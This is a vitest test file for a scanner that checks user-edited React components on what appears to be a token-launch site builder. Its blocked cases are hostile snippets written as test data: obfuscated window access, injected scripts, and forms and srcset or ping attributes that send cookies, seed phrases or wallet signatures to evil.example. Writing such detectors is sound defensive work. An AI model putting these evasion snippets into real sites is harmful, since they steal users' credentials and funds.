import { describe, expect, it } from 'vitest';

import { ADDR, added, modified, rulesOf, scan, scanComponent } from './test-helpers.js';

const RELAY = { r2PublicHost: 'media.forge.example' };

function expectBlocked(cases: Record<string, string>): void {
  for (const [name, src] of Object.entries(cases)) {
    it(`blocks: ${name}`, () => {
      expect(scanComponent(src), src).not.toEqual([]);
    });
  }
}

function expectAllowed(cases: Record<string, string>): void {
  for (const [name, src] of Object.entries(cases)) {
    it(`allows: ${name}`, () => {
      expect(scanComponent(src, RELAY), src).toEqual([]);
    });
  }
}

describe('dynamic property access on a window or document taken from a variable', () => {
  expectBlocked({
    'defaultView stored then called with a runtime key': `const w: any = document.defaultView; const k = ['f', 'e', 't', 'c', 'h'].map((c) => c).join(''); w[k]('https://evil.example/c?x=1');`,
    'event.view in an onClick handler': `export const C = () => <button onClick={(e) => { const w: any = e.view; const k = ['ev', 'al'].map((s) => s).join(''); w[k]('alert(1)'); }}>x</button>;`,
    'event.view read then called': `export const f = (e: any, k: string) => { const g = e.view[k]; return g('https://evil.example'); };`,
    'ownerDocument stored then indexed': `export const f = (el: HTMLElement, k: string) => { const d: any = el.ownerDocument; return d[k]; };`,
    'optional chaining with a runtime key': `export const f = (w: any, k: string) => w?.[k]?.('https://evil.example');`,
    'for-in over a window value': `export const f = (w: any) => { for (const k in w) if (k.length === 5) w[k]('https://evil.example'); };`,
    'computed destructuring with a runtime key': `export const f = (w: any, k: string) => { const { [k]: g } = w; return g; };`,
    'Object.values over event.view': `export const f = (e: any) => Object.values(e.view).find((v: any) => typeof v === 'function' && v.name.startsWith('fe'));`,
    'Object.entries over getRootNode': `export const f = (el: Element) => Object.entries(el.getRootNode() as any);`,
    'Object.getOwnPropertyDescriptor with a runtime key': `export const f = (w: any, k: string) => Object.getOwnPropertyDescriptor(w, k)!.value;`,
    'Object.assign copying a window into a literal': `const T: any = {}; export const f = (e: any, k: string) => { Object.assign(T, e.view); return T[k]; };`,
    'Object.setPrototypeOf on a literal': `const T: any = {}; export const f = (e: any, k: string) => { Object.setPrototypeOf(T, e.view); return T[k]; };`,
    '__proto__ in an object literal': `export const f = (e: any, k: string) => { const T: any = { __proto__: e.view }; return T[k]; };`,
    'Object aliased': `const O = Object; export const f = (w: any) => O.values(w);`,
    'defaultView used as a value': `export const w = document.defaultView;`,
    'contentWindow used as a value': `export const f = (el: HTMLIFrameElement) => { const w: any = el.contentWindow; return w; };`,
    'numeric-looking key with a string parameter': `export const f = (xs: any, i: any) => xs[i + 1];`,
    'runtime key on a parameter': `export const f = (o: any, k: string) => o[k];`,
    'Object method through a computed name': `export const f = (w: any) => (Object as any)['val' + 'ues'](w);`,
    'Object method destructured': `const { values } = Object; export const f = (w: any) => values(w);`,
    'rest destructuring of event.view': `export const f = (e: any, k: string) => { const { ...r } = e.view; return r[k]; };`,
    'literal const shadowed by a parameter': `const T = { a: 1 }; export const f = (T: any, k: string) => T[k];`,
  });

  expectAllowed({
    'lookup in a const object literal': `const theme = { a: '#fff', b: '#000' }; export const c = (k: string) => (theme as Record<string, string>)[k];`,
    'lookup in a const array literal': `const COLORS = ['#f00', '#0f0']; export const c = (i: number) => COLORS[i % 2];`,
    'numeric literal and arithmetic indexes': `export const f = (xs: string[]) => [xs[0], xs[xs.length - 1], xs[Math.floor(xs.length / 2)]];`,
    'array .at() with a variable index': `export const pick = (xs: string[], i: number) => xs.at(i) ?? xs.at(i + 1);`,
    'Object.entries over a const literal': `const LINKS = { x: '/x', docs: '/docs' }; export const L = () => <ul>{Object.entries(LINKS).map(([k, v]) => <li key={k}>{v}</li>)}</ul>;`,
    'Object.assign with literal sources': `export const merge = () => Object.assign({}, { a: 1 }, { b: 2 });`,
    'element.defaultView member read': `export const width = () => document.defaultView!.innerWidth;`,
  });
});

describe('createElement with a tag that cannot be folded', () => {
  expectBlocked({
    'runtime-built script tag with Object.assign src': `const t = ['s', 'c', 'r', 'i', 'p', 't'].map((c) => c).join(''); const el = document.createElement(t); Object.assign(el, { src: 'https://evil.example/x.js' }); document.body.appendChild(el);`,
    'tag from a parameter': `export const f = (t: string) => document.createElement(t);`,
    'ownerDocument stored in a variable': `export const f = (el: HTMLElement, t: string) => { const d: any = el.ownerDocument; return d.createElement(t); };`,
    'createElement bound and called later': `export const f = (t: string) => { const ce = document.createElement.bind(document); return ce(t); };`,
    'getRootNode document': `export const f = (el: Element, t: string) => (el.getRootNode() as Document).createElement(t);`,
    'React.createElement with a runtime string and src': `import React from 'react'; export const f = (t: string) => React.createElement(t, { async: true, src: 'https://evil.example/x.js' });`,
    'Object.assign with a dynamic src': `export const f = (s: string) => Object.assign(new Image(), { src: 'https://evil.example/?' + s });`,
    'Object.assign with non-literal props': `export const f = (el: HTMLElement, props: any) => Object.assign(el, props);`,
    'Object.defineProperty src': `export const f = (el: HTMLElement) => Object.defineProperty(el, 'src', { value: 'https://evil.example/x.js' });`,
    'createAttribute and setAttributeNode': `export const f = (el: Element, u: string) => { const a = document.createAttribute('src'); a.value = u; el.setAttributeNode(a); };`,
    'attribute node value through element.attributes': `export const f = (i: HTMLImageElement, u: string) => { i.attributes[0]!.value = u; };`,
    'createElement through Document.prototype': `export const f = (t: string) => Document.prototype.createElement.call(document, t);`,
    'bare createElement imported from react': `import { createElement } from 'react'; export const f = (t: string) => createElement(t, { async: true, src: 'https://evil.example/x.js' });`,
    'jsx runtime with a runtime type': `import { jsx } from 'react/jsx-runtime'; export const f = (t: string) => jsx(t, { action: 'https://evil.example/s' });`,
    'cloneElement adding an action': `import { cloneElement } from 'react'; export const C = () => cloneElement(<form />, { action: 'https://evil.example/s' });`,
    'DOMParser nodes appended to the page': `export const f = (s: string) => document.body.append(...new DOMParser().parseFromString(s, 'text/html').body.childNodes);`,
    'Object.assign with a shorthand src': `export const f = (i: HTMLImageElement) => { const src = 'https://evil.example/x.js'; Object.assign(i, { src }); };`,
    'Object.assign with a src getter': `export const f = (i: HTMLImageElement, u: string) => Object.assign(i, { get src() { return u; } });`,
  });

  expectAllowed({
    'React.createElement with an imported component': `import React from 'react'; import { Star } from 'lucide-react'; export const f = (n: number) => React.createElement(Star, { size: n });`,
    'React.createElement with a local component': `import { createElement } from 'react'; function Box() { return <div />; } export const f = () => createElement(Box, null);`,
    'document.createElement with a static tag': `export const f = () => document.createElement('div');`,
  });
});

describe('JSX tag that cannot be folded', () => {
  expectBlocked({
    'conditional form with an external action': `export const C = ({ x }: { x: boolean }) => { const T: any = x ? 'section' : 'form'; return <T action="https://evil.example/steal" method="post"><input name="seed" /></T>; };`,
    'useState form': `import { useState } from 'react'; export const C = () => { const [T] = useState<any>('fo' + 'rm'); return <T action="https://evil.example/steal"><input name="seed" /></T>; };`,
    'link href': `export const C = ({ x }: { x: boolean }) => { const T: any = x ? 'span' : 'link'; return <T rel="stylesheet" href="https://evil.example/a.css" />; };`,
    'object data': `export const C = ({ x }: { x: boolean }) => { const T: any = x ? 'span' : 'object'; return <T data="https://evil.example/a" />; };`,
    'tag from a prop': `export const C = ({ T }: any) => <T action="https://evil.example/steal" />;`,
    'tag from an object member': `const s: any = { T: Math.random() > 0.5 ? 'form' : 'div' }; export const C = () => <s.T action="https://evil.example/steal" />;`,
    'spread attributes on a dynamic tag': `export const C = ({ T, p }: any) => <T {...p} />;`,
    'formAction on a dynamic tag': `export const C = ({ T }: any) => <T formAction="https://evil.example/x">Go</T>;`,
    'styled form': `import styled from 'styled-components'; const F = styled.form\`\`; export const C = () => <F action="https://evil.example/s" />;`,
    'memo of a tag name': `import { memo } from 'react'; const F: any = memo('form' as any); export const C = () => <F action="https://evil.example/s" />;`,
    'as prop set to form': `const Box = ({ as: Tag = 'div', ...rest }: any) => <Tag {...rest} />; export const C = () => <Box as="form" action="https://evil.example/steal" />;`,
  });

  expectAllowed({
    'polymorphic tag with plain attributes': `export const Box = ({ as: Tag = 'div', children }: any) => <Tag className="box">{children}</Tag>;`,
    'imported component with an external href': `import { Button } from '@/components/ui/button'; export const C = () => <Button href="https://example.com/x">x</Button>;`,
    'forwardRef, dynamic and context components': `import { createContext, forwardRef } from 'react'; import dynamic from 'next/dynamic'; const In = forwardRef<HTMLInputElement>((p, ref) => <input ref={ref} {...p} />); const Chart = dynamic(() => import('./Chart'), { ssr: false }); const Ctx = createContext(0); export const C = () => <Ctx.Provider value={1}><In /><Chart /></Ctx.Provider>;`,
    'local component': `function Card({ children }: { children: React.ReactNode }) { return <div>{children}</div>; } export const C = () => <Card>x</Card>;`,
  });
});

describe('forbidden imports already present in a template file', () => {
  const base = `import { useWallet } from '@jup-ag/wallet-adapter';\nexport function Header() { const w = useWallet(); return <div>{String(w.connected)}</div>; }\n`;
  const path = 'src/components/Header.tsx';
  const rules = (next: string) => rulesOf(scan([modified(path, base, next)]));

  it('blocks a new name added to the existing import', () => {
    expect(rules(base.replace('{ useWallet }', '{ useWallet, useConnection }'))).toContain('forbidden-import');
  });
  it('blocks a subpath of the same package', () => {
    expect(rules(base.replace("'@jup-ag/wallet-adapter'", "'@jup-ag/wallet-adapter/dist/x'"))).toContain('forbidden-import');
  });
  it('blocks a default import added to the existing import', () => {
    expect(rules(base.replace('{ useWallet }', 'WA, { useWallet }'))).toContain('forbidden-import');
  });
  it('blocks a namespace import replacing the existing one', () => {
    expect(rules(base.replace('{ useWallet }', '* as WA').replace('useWallet()', 'WA.useWallet()'))).toContain('forbidden-import');
  });
  it('blocks an aliased name', () => {
    expect(rules(base.replace('{ useWallet }', '{ useWallet as uw }').replace('useWallet()', 'uw()'))).toContain('forbidden-import');
  });
  it('blocks a runtime-built method name on the wallet object', () => {
    const next = `${base}export function Claim() { const wallet: any = useWallet(); const k = ['sign', 'Message'].map((s) => s).join(''); return <button onClick={() => wallet[k](new Uint8Array(1))}>Claim airdrop</button>; }\n`;
    expect(rules(next)).toContain('global-access');
  });
  it('still allows unrelated edits to a file with the import', () => {
    expect(scan([modified(path, base, base.replace('<div>', '<div className="p-2">'))])).toEqual({ ok: true });
  });
  it('still allows reordering the imported names', () => {
    const two = base.replace('{ useWallet }', '{ useWallet, useUnifiedWalletContext }');
    expect(scan([modified(path, two, two.replace('{ useWallet, useUnifiedWalletContext }', '{ useUnifiedWalletContext, useWallet }'))])).toEqual({ ok: true });
  });
});

describe('Solana address split into short fragments', () => {
  const A = ADDR.slice(0, 20);
  const B = ADDR.slice(20);
  const hasAddr = (r: string[]) => r.some((x) => x === 'solana-address' || x === 'solana-address-encoded');

  it('detects fragments joined with map', () => {
    expect(hasAddr(scanComponent(`const p = ['${A}', '${B}']; export const C = () => <p>{p.map((s) => s).join('')}</p>;`))).toBe(true);
  });
  it('detects fragments in separate constants', () => {
    expect(hasAddr(scanComponent(`const a = '${A}'; const b = '${B}'; export const C = () => <p>{[a, b].map((s) => s.trim()).join('')}</p>;`))).toBe(true);
  });
  it('detects fragments of 11 characters', () => {
    const parts = ADDR.match(/.{1,11}/g) ?? [];
    expect(hasAddr(scanComponent(`const p = [${parts.map((s) => `'${s}'`).join(', ')}]; export const C = () => <p>{p.map((s) => s).join('')}</p>;`))).toBe(true);
  });
  it('detects Markdown emphasis inside an address', () => {
    expect(rulesOf(scan([added('src/content/about.md', `Official CA: ${A}**${B}**`)]))).toContain('solana-address');
  });
  it('detects Markdown code and HTML comments inside an address', () => {
    expect(rulesOf(scan([added('src/content/about.md', `CA: \`${A}\`<!-- x -->_${B}_`)]))).toContain('solana-address');
  });
  it('detects an address split across JSON fields', () => {
    expect(rulesOf(scan([added('src/content/home.json', JSON.stringify({ a: A, b: B }))]))).toContain('solana-address');
  });
  it('detects a single long fragment on its own', () => {
    expect(hasAddr(scanComponent(`export const P = '${A}';`))).toBe(true);
  });
  it('does not flag word lists, prose or camelCase strings', () => {
    const src = `const NAV = ['Home', 'About', 'Tokenomics', 'Roadmap', 'Community', 'Docs', 'Partners', 'Careers']; export const C = () => <nav>{NAV.map((n) => <span key={n}>{n}</span>)}</nav>; export const H = 'PreviewHeroSectionBackground';`;
    expect(scanComponent(src)).toEqual([]);
    expect(scan([added('src/content/about.md', '**Launch** your _own_ coin in `minutes` with <b>FORGE</b>.')])).toEqual({ ok: true });
    expect(scan([added('src/content/about.md', '![hero](https://media.forge.example/7f3KpQ2mZx9WvB4nAbCd.png) and [docs](/docs/Ab3kP9qRsTuVwXyZ2)')])).toEqual({ ok: true });
  });
});

describe('URL attributes beyond src and href', () => {
  expectBlocked({
    'srcset assignment': `export const f = () => { const i = new Image(); i.srcset = 'https://evil.example/?' + document.cookie; };`,
    'srcset static list with an external entry': `export const f = (i: HTMLImageElement) => { i.srcset = '/a.png 1x, https://evil.example/b.png 2x'; };`,
    'srcset with a dynamic tail after a local entry': `export const f = (i: HTMLImageElement, s: string) => { i.srcset = '/a.png 1x, ' + s; };`,
    'poster assignment': `export const f = (v: HTMLVideoElement, s: string) => { v.poster = 'https://evil.example/?' + s; };`,
    'setAttribute srcset': `export const f = (i: Element, s: string) => i.setAttribute('srcset', 'https://evil.example/?' + s);`,
    'setAttribute ping': `export const f = (a: Element) => a.setAttribute('ping', 'https://evil.example/p');`,
    'ping attribute with a dynamic URL': `export const C = ({ pk }: { pk: string }) => <a href="/" ping={\`https://evil.example/\${pk}\`}>x</a>;`,
    'ping attribute with a static external URL': `export const C = () => <a href="/" ping="https://evil.example/p">x</a>;`,
    'img srcSet with a dynamic second entry': `export const C = ({ s }: { s: string }) => <img src="/a.png" srcSet={\`/a.png 1x, \${s} 2x\`} alt="" />;`,
  });

  expectAllowed({
    'local srcset assignment': `export const f = (i: HTMLImageElement) => { i.srcset = '/a.png 1x, /b.png 2x'; };`,
    'static img srcSet': `export const C = () => <img src="/a.png" srcSet="/a.png 1x, /b.png 2x" alt="" />;`,
    'data property on a plain object': `export const f = (o: { data: unknown }, v: unknown) => { o.data = v; };`,
  });
});
